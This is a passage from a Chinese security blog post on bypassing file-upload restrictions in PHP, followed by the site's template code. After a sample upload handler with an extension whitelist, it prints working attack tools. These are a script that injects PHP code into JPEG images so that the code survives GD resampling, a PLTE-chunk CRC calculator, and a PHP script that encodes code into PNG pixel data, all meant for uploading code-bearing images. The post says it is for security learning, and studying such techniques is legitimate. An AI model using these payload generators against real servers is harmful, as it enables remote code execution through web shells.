$allow_extensions=array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);
$extension=end(explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]));
if(in_array($extension,$allow_extensions)){
    if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)
    {
        echo &quot;错误：&quot;.$_FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;br&gt;&quot;;
    }
    else
    {
        echo &quot;文件名：&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;].&quot;&lt;br&gt;&quot;;
        echo &quot;文件类型：&quot;.$_FILES[&quot;file&quot;][&quot;type&quot;].&quot;&lt;br&gt;&quot;;
        echo &quot;文件大小：&quot;.$_FILES[&quot;file&quot;][&quot;size&quot;].&quot;&lt;br&gt;&quot;;
        echo &quot;文件临时位置：&quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&quot;&lt;br&gt;&quot;;
    }

    if(file_exists(&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]))
    {
        echo $_FILES[&quot;file&quot;][&quot;name&quot;].&quot;文件已存在&quot;;
    }
    else
    {
        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);
        echo &quot;文件保存在：&quot;.&quot;files/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
    }
}
else
{
    echo &quot;非法文件&quot;;
}
?&gt;</code></pre><p><img src="/File-Upload/1.png" alt></p>
<p><strong><span id="jump">大牛编写的脚本jpg_payload.php</span></strong></p>
<pre><code>&lt;?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;


    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {
        die(&#39;php-gd is not installed&#39;);
    }

    if(!isset($argv[1])) {
        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
    }

    set_error_handler(&quot;custom_error_handler&quot;);

    for($pad = 0; $pad &lt; 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis-&gt;readShort() != 0xFFD8) {
            die(&#39;Incorrect SOI marker&#39;);
        }

        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - 2;
            $dis-&gt;skip($size);
            if($marker === 0xDA) {
                $startPos = $dis-&gt;seek();
                $outStreamTmp =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .
                    substr($outStream, $startPos);
                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis-&gt;eof())) {
                        if($dis-&gt;readByte() === 0xFF) {
                            if($dis-&gt;readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis-&gt;seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream =
                        substr($outStream, 0, $startPos) .
                        $miniPayload .
                        substr(
                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {
                    die(&#39;Success!&#39;);
                } else {
                    break;
                }
            }
        }
    }
    unlink(&#39;payload_&#39;.$argv[1]);
    die(&#39;Something\&#39;s wrong&#39;);

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this-&gt;binData = &#39;&#39;;
            $this-&gt;order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
                $this-&gt;binData = file_get_contents($filename);
            } else {
                $this-&gt;binData = $filename;
            }
            $this-&gt;size = strlen($this-&gt;binData);
        }

        public function seek() {
            return ($this-&gt;size - strlen($this-&gt;binData));
        }

        public function skip($skip) {
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        }

        public function readByte() {
            if($this-&gt;eof()) {
                die(&#39;End Of File&#39;);
            }
            $byte = substr($this-&gt;binData, 0, 1);
            $this-&gt;binData = substr($this-&gt;binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this-&gt;binData) &lt; 2) {
                die(&#39;End Of File&#39;);
            }
            $short = substr($this-&gt;binData, 0, 2);
            $this-&gt;binData = substr($this-&gt;binData, 2);
            if($this-&gt;order) {
                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
        }
    }
?&gt;</code></pre><p><strong><span id="jump">PLTE数据块写入php代码计算CRC脚本</span></strong>：png_PLTE_crc.py</p>
<pre><code>import binascii
import re

png = open(r&#39;4.png&#39;,&#39;rb&#39;)
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)

&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;
data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]
crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff
print hex(crc)</code></pre><p><strong><span id="jump">大牛写的脚本png.php</span></strong>，直接拿来运行即可</p>
<pre><code>&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y &lt; sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,&#39;./1.png&#39;);
?&gt;</code></pre>
      
       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。—— </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>File-Upload</p>
    
    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
    <p><span class="copy-title">发布时间:</span>2020-01-06, 18:23:35</p>
    <p><span class="copy-title">最后更新:</span>2020-06-07, 23:28:16</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/File-Upload/" title="File-Upload">https://10fteam.github.io/File-Upload/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2019-2020 10fteam</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#CTF','#encrypt_decrypt','#知识','#backdoor','#shell','#工具','#内网渗透','#C2','#kali','#漏洞','#CVE','#vulhub','#HTB','#靶机','#writeup','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#linux','#脚本','#MSF','#proxy','#PHP','#代码审计','#POC','#EXP','#PWN','#python','#数据库','#mssql','#注入','#phpmyadmin','#SQL','#Struts2','#中间件','#weblogic','#windows','#mimikatz','#xss','#DOM','#bypass','#encode_decode','#后门','#靶场','#vulnhub','#僵尸网络','#webshell','#免杀','#绕过','#域渗透','#端口','#提权','#CDN','#DLL','#WAF','#MISC','#逆向',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().split('\n').length - 1, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: #fafafa;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        <!--width: 542px;-->
        width: 270px;
    }
    .nav.fullscreen {
        <!--margin-left: -542px;-->
        margin-left: -270px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>









</html>
